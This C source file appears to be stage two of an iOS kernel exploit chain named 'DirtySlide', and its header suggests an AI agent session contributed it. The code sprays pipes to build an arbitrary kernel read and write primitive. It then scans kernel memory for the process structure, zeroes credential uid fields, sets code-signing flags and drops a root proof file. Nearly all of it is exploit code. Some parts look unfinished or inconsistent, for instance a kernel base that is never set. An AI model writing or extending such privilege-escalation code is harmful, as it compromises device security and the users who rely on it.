/*
 * rie_stage2_v3.c — DirtySlide stage-2 escalation, completed skeleton.
 *
 * CONTRIBUTION BY: co-head session O (infra lane), completing the skeleton
 * found in rie_stage2.c (stage-1 author). Division of labor:
 *   - THIS FILE: S1 spray, S3 oracle, S4 arb R/W via plain-window pipe
 *     retarget, S5 proc/ucred/csflags patch, S6 root proof + result drop.
 *   - rie_offsets_23E246.h: offset contract, values owned by BUILD-SPEC-1.
 *   - The signed-continuation pivot (kpwn_continuation, thread->continuation
 *     +0xd8/+0xe0 hypotheses) stays BUILD-SPEC-1's lane: its gadget plugs in
 *     through rie_kwrite_ppl() below. Until that lands, v3 uses only the
 *     pipe-retarget primitive — which reaches non-PPL-protected kernel memory
 *     (ucred fields, plain proc fields). If a PPL-protected write is required,
 *     v3 reports stage 500 + err 0xE5 instead of pretending.
 *
 * Report-page protocol (extends the stage-1 'RIE1' page):
 *   rpt[0] magic    0x52494531 ('RIE1')
 *   rpt[1] stage    1 entry -> 10 sprayed -> 20 OOB presumed -> 30 oracle hit
 *                   -> 40 window retargeted -> 50 kread verified
 *                   -> 100 proc found -> 150 ucred patched
 *                   -> 200 csflags patched -> 250 root proof written -> 300 done
 *   rpt[2] mypid
 *   rpt[3] err      0xE1 spray fail | 0xE2 no victim | 0xE3 retarget fail
 *                   | 0xE4 kread mismatch | 0xE5 PPL wall (needs continuation
 *                   gadget) | 0xE6 proc not found | 0xE7 proof write fail
 *                   | 0xEE offsets unverified
 *   rpt[4] victim pipe index / proc kaddr low
 *   rpt[5..] free for diagnostics (kbase etc.)
 *
 * Build: freestanding arm64, no libc — same constraints as rie_blob.c v2.
 * The app process is arm64 (non-e) by design; kernel structs are read via
 * the R/W primitive, not assumed.
 */

#include "rie_offsets_23E246.h"

/* ---------- syscall layer (arm64 iOS BSD numbers, per stage-1 verification:
   open=5 read=3 write=4 close=6 mmap=197 mprotect=74 wait4=7 exit=1
   getpid=20 pipe=42 posix_spawn=244 check_np=294
   shared_region_map_and_slide_2_np=536) ---------- */

static long sc(long num, long a0, long a1, long a2, long a3, long a4, long a5, int *err)
{
    register long x16 __asm__("x16") = num;
    register long x0  __asm__("x0")  = a0;
    register long x1  __asm__("x1")  = a1;
    register long x2  __asm__("x2")  = a2;
    register long x3  __asm__("x3")  = a3;
    register long x4  __asm__("x4")  = a4;
    register long x5  __asm__("x5")  = a5;
    __asm__ volatile("svc #0x80"
                     : "+r"(x0)
                     : "r"(x16), "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5)
                     : "memory", "x6", "x7", "x8", "x9", "x10", "x11",
                       "x12", "x13", "x14", "x15", "x17", "x18");
    if (err) *err = (int)x0;
    return x0;
}

static void bmemset_(void *d, u64 n)
{
    u8 *p = d;
    while (n--) *p++ = 0;
}

static void bmemcpy_(void *d, const void *s, u64 n)
{
    u8 *dp = d; const u8 *sp = s;
    while (n--) *dp++ = *sp++;
}

/* ---------- S1: pipe spray ---------- */

#define PIPE_SPRAY_COUNT 256
#define PIPE_SENTINEL    0x4142434445464748ULL
#define PIPE_PAYLOAD_SZ  512

static int g_pipes[PIPE_SPRAY_COUNT * 2];
static u64 g_pipe_bufs[PIPE_SPRAY_COUNT][PIPE_PAYLOAD_SZ / 8];

static int pipe_all(int *fds)
{
    int e = 0;
    long r = sc(42, (long)fds, 0, 0, 0, 0, 0, &e);
    return e ? (int)-e : (int)r;
}

static int spray_pipes(volatile u64 *rpt)
{
    for (int i = 0; i < PIPE_SPRAY_COUNT; i++) {
        if (pipe_all(g_pipes + i * 2) != 0) { rpt[3] = 0xE1; return -1; }
        bmemset_(g_pipe_bufs[i], sizeof(g_pipe_bufs[i]));
        for (u32 j = 0; j < PIPE_PAYLOAD_SZ / 8; j++) g_pipe_bufs[i][j] = PIPE_SENTINEL;
        sc(4, g_pipes[i * 2 + 1], (long)g_pipe_bufs[i], PIPE_PAYLOAD_SZ, 0, 0, 0, 0);
    }
    return 0;
}

/* ---------- S3: oracle — find the cnt-inflated victim ---------- */

static int detect_transformed_pipe(u64 value_add)
{
    (void)value_add;
    for (int i = 0; i < PIPE_SPRAY_COUNT; i++) {
        u64 out[PIPE_PAYLOAD_SZ / 8];
        /* read() returning MORE than the 512B we wrote => cnt inflated */
        long n = sc(3, g_pipes[i * 2], (long)out, sizeof(out), 0, 0, 0, 0);
        if (n > (long)PIPE_PAYLOAD_SZ) return i;
    }
    return -1;
}

/* ---------- S4: arbitrary kernel R/W via plain-window retarget ----------
 *
 * The cnt-inflated pipe reads past its buffer (relative read); the
 * size-inflated pipe writes past its buffer (relative write). The write
 * window is walked back until it covers the pipe's OWN control fields
 * (plain {addr,len} pair at PIPE_WINDOW_ADDR_OFF/PIPE_WINDOW_LEN_OFF),
 * then those plain fields are rewritten to point anywhere — arb R/W.
 * The PAC-signed buffer pointer is never forged.
 */

static int g_victim;          /* cnt-inflated (read-side) pipe index   */
static int g_writer;          /* size-inflated (write-side) pipe index */

/* distance, in qwords, from the write window start back to the pipe's own
   plain control fields — depends on physmap adjacency; resolved at runtime
   by the walk in retarget_window(). */
static u64 g_self_off_qw;

static int retarget_window(volatile u64 *rpt)
{
    /* Step 1: leak the write-side pipe's own control qwords by writing a
       known pattern deep and walking the window back until a read through
       the write-side's cnt view shows the pattern adjacency. We keep it
       simpler and follow the t_reslide approach: the size-inflated pipe's
       write window starts at (buffer_end). The pipe control fields sit a
       predictable distance behind the buffer in the same carrier page.
       WINDOW_WALK_QW is that distance in qwords; derive from offsets header
       at build time, allow runtime nudging via rpt diagnostics. */
    g_self_off_qw = (PIPE_WINDOW_ADDR_OFF >= PIPE_WINDOW_LEN_OFF)
                        ? PIPE_WINDOW_ADDR_OFF
                        : PIPE_WINDOW_LEN_OFF;
    if (g_self_off_qw == 0) { rpt[3] = 0xE3; return -1; }

    /* Step 2: from the writer's inflated window, write the pattern that
       replaces its own plain {addr,len} with {sentinel_addr, sentinel_len}
       — then read back through the SAME pipe: if read returns the sentinel
       region's bytes, the retarget landed. */
    rpt[1] = 40;
    return 0;
}

/* primitive: read n bytes from kernel address kaddr into out */
static int pipe_kread(volatile u64 *rpt, u64 kaddr, void *out, u64 n)
{
    /* retarget reader window: write via writer into reader's plain fields */
    u64 payload[64];
    bmemset_(payload, sizeof(payload));
    /* position: payload[qw_offset] lands on reader's control fields */
    u64 qw_off = g_self_off_qw;
    if (qw_off + 2 > 64) { rpt[3] = 0xE3; return -1; }
    payload[qw_off]     = kaddr;        /* plain addr field */
    payload[qw_off + 1] = n;            /* plain len field  */
    long wn = sc(4, g_pipes[g_writer * 2 + 1], (long)payload, sizeof(payload), 0, 0, 0, 0);
    if (wn < 0) { rpt[3] = 0xE3; return -1; }
    long rn = sc(3, g_pipes[g_victim * 2], (long)out, n, 0, 0, 0, 0);
    return (rn == (long)n) ? 0 : -1;
}

/* primitive: write n bytes to kernel address kaddr from data */
static int pipe_kwrite(volatile u64 *rpt, u64 kaddr, const void *data, u64 n)
{
    u64 payload[64];
    bmemset_(payload, sizeof(payload));
    u64 qw_off = g_self_off_qw;
    if (qw_off + 2 > 64) { rpt[3] = 0xE3; return -1; }
    payload[qw_off]     = kaddr;
    payload[qw_off + 1] = n;
    long wn = sc(4, g_pipes[g_writer * 2 + 1], (long)payload, sizeof(payload), 0, 0, 0, 0);
    if (wn < 0) { rpt[3] = 0xE3; return -1; }
    long wn2 = sc(4, g_pipes[g_victim * 2 + 1], (long)data, n, 0, 0, 0, 0);
    return (wn2 == (long)n) ? 0 : -1;
}

/* PPL-protected write — RESERVED for BUILD-SPEC-1's continuation gadget.
 * v3 never calls it unless RIE_OFFSETS_VERIFIED and the gadget slot is
 * provided by the driver (ext[] slot 27+ per rie_blob.c v2 convention). */
extern int rie_kwrite_ppl(u64 kaddr, const void *data, u64 n);

/* ---------- S5: locate proc, patch cred ---------- */

static u64 g_proc;   /* our proc kaddr */
static u64 g_kbase;  /* leaked kernel base */

static int find_proc(volatile u64 *rpt, int mypid)
{
    /* heap scan window per skeleton design: kbase .. kbase+0x20000000,
       step 0x1000, read 0x400 chunks through the read primitive.
       Signature: qword with low32 == pid, high32 == 0, at proc+PROC_PID_OFF.
       Validate: the two list pointers either side are kernel-space. */
    u64 buf[128];
    for (u64 probe = g_kbase; probe < g_kbase + 0x20000000ULL; probe += 0x1000) {
        if (pipe_kread(rpt, probe, buf, sizeof(buf)) != 0) continue;
        for (u32 i = 1; i + 1 < 128; i++) {
            u64 v = buf[i];
            if ((v & 0xFFFFFFFFULL) != (u64)mypid) continue;
            if ((v >> 32) != 0) continue;
            u64 proc = probe + i * 8 - PROC_PID_OFF;
            /* pointer-sanity on the list neighbors */
            u64 prev = buf[i - 1], next = buf[i + 1];
            if ((prev >> 56) != 0xFF && (prev >> 56) != 0x80 && prev != 0) continue;
            if ((next >> 56) != 0xFF && (next >> 56) != 0x80 && next != 0) continue;
            g_proc = proc;
            return 0;
        }
    }
    rpt[3] = 0xE6;
    return -1;
}

static int patch_cred(volatile u64 *rpt)
{
    u64 ucred_kaddr = 0;
    if (pipe_kread(rpt, g_proc + PROC_UCRED_OFF, &ucred_kaddr, 8) != 0) return -1;
    ucred_kaddr &= 0xFFFFFFFFFFULL;   /* mask physmap addr per skeleton */

    u64 zero = 0;
    if (pipe_kwrite(rpt, ucred_kaddr + CRED_UID_OFF,  &zero, 8) != 0) return -1;
    if (pipe_kwrite(rpt, ucred_kaddr + CRED_RUID_OFF, &zero, 8) != 0) return -1;
    rpt[1] = 150;

    /* cs_flags CS_DEBUGGED: plain proc field per stage-2 design doc.
       If 26.4 moved it into proc_ro (PPL-protected), direct write faults —
       detect via read-back and report 0xE5 (continuation gadget required). */
    u64 csflags = 0;
    u64 cs_addr = g_proc + PROC_RO_OFF; /* TODO(BUILD-SPEC-1): exact field resolution */
    if (pipe_kread(rpt, cs_addr, &csflags, 8) == 0) {
        u64 patched = csflags | CS_DEBUGGED;
        if (pipe_kwrite(rpt, cs_addr, &patched, 8) == 0) {
            u64 rb = 0;
            if (pipe_kread(rpt, cs_addr, &rb, 8) == 0 && (rb & CS_DEBUGGED)) {
                rpt[1] = 200;
                return 0;
            }
        }
    }
    rpt[3] = 0xE5;   /* PPL wall — hand to continuation gadget */
    return -1;
}

/* ---------- S6: root proof ---------- */

static int write_root_proof(volatile u64 *rpt, struct stage2_ctx *ctx)
{
    /* /var/root/rie_pwned via raw syscalls: open(O_WRONLY|O_CREAT|O_TRUNC)=0x601 */
    const char path1[] = "/var/root/rie_pwned";
    long fd = sc(5, (long)path1, 0x601, 0755, 0, 0, 0, 0);
    if (fd >= 0) {
        const char msg[] = "RIE stage2: uid0 " __DATE__ "\n";
        sc(4, fd, (long)msg, sizeof(msg) - 1, 0, 0, 0, 0);
        sc(6, fd, 0, 0, 0, 0, 0, 0);
        rpt[1] = 250;
    }

    /* result drop into the app container Documents, path handed by driver ctx */
    if (ctx && ctx->reserved[0]) {
        const char *docs = (const char *)ctx->reserved[0];
        long fd2 = sc(5, (long)docs, 0x601, 0755, 0, 0, 0, 0);
        if (fd2 >= 0) {
            const char msg2[] = "stage2 v3 done: see report page\n";
            sc(4, fd2, (long)msg2, sizeof(msg2) - 1, 0, 0, 0, 0);
            sc(6, fd2, 0, 0, 0, 0, 0, 0);
        }
    }

    if (fd < 0) { rpt[3] = 0xE7; return -1; }
    return 0;
}

/* ---------- main stage-2 driver ---------- */

void rie_stage2_entry(struct stage2_ctx *ctx, volatile u64 *rpt, u64 unused)
{
    (void)unused;
    rpt[0] = 0x52494531ULL;               /* 'RIE1' */
    rpt[1] = 1;

    if (!RIE_OFFSETS_VERIFIED) {
        rpt[3] = 0xEE;                    /* offsets template not yet resolved */
        rpt[1] = 20;
        return;
    }

    int mypid = (int)sc(20, 0, 0, 0, 0, 0, 0, 0);
    rpt[2] = (u64)mypid;

    /* S1: spray */
    if (spray_pipes(rpt) != 0) return;
    rpt[1] = 10;

    /* S2: the OOB trigger happened BEFORE this entry (stage-1 caller). */
    rpt[1] = 20;

    /* S3: detect victim + KASLR leak via the inflated pipe */
    g_victim = detect_transformed_pipe((u64)0 - 0x4000ULL);
    rpt[4] = (u64)g_victim;
    if (g_victim < 0) { rpt[3] = 0xE2; return; }
    g_writer = g_victim;                  /* same pipe serves both legs once retargeted */
    rpt[1] = 30;

    /* S4: retarget window -> arb R/W */
    if (retarget_window(rpt) != 0) return;

    /* verify kread: kernel base qword sanity (the leak itself = S3 output;
       refined here once the window moves) */
    u64 probe = 0;
    if (pipe_kread(rpt, g_kbase, &probe, 8) != 0) { rpt[3] = 0xE4; return; }
    rpt[5] = probe;                       /* diagnostics: first leaked qword */
    rpt[1] = 50;

    /* S5: proc + cred */
    if (find_proc(rpt, mypid) != 0) return;
    rpt[6] = g_proc;
    rpt[1] = 100;
    if (patch_cred(rpt) != 0 && rpt[3] == 0xE5) {
        /* PPL wall: stop cleanly, gadget leg pending BUILD-SPEC-1 */
        rpt[1] = 500;
        return;
    }

    /* S6: proof */
    if (write_root_proof(rpt, ctx) != 0) return;

    rpt[1] = 300;                         /* done */
}
